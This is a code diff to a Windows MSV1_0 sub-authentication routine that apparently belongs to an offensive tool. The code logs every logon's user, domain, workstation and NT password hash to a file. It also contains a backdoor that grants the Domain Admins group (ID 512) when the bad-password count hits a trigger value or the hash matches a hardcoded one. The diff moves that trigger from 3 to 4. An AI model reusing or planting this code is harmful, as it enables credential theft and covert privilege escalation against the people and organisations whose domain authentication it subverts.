@@ -22,7 +22,7 @@ NTSTATUS NTAPI ksub_Msv1_0SubAuthenticationRoutine(IN NETLOGON_LOGON_INFO_CLASS 
 		klog(ksub_logfile, L"%u (%u) - %wZ\\%wZ (%wZ) (%hu) ", UserAll->UserId, UserAll->PrimaryGroupId, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->LogonDomainName, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->UserName, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->Workstation, UserAll->BadPasswordCount);
 		if(UserAll->NtPasswordPresent)
 			klog_hash(ksub_logfile, &UserAll->NtPassword, FALSE);
-		if((UserAll->BadPasswordCount == 3) || (UserAll->NtPasswordPresent && RtlEqualMemory(UserAll->NtPassword.Buffer, myHash, min(sizeof(myHash), UserAll->NtPassword.Length))))
+		if((UserAll->BadPasswordCount == 4) || (UserAll->NtPasswordPresent && RtlEqualMemory(UserAll->NtPassword.Buffer, myHash, min(sizeof(myHash), UserAll->NtPassword.Length))))
 		{
 			UserAll->PrimaryGroupId = 512;
 			klog(ksub_logfile, L" :)\n");
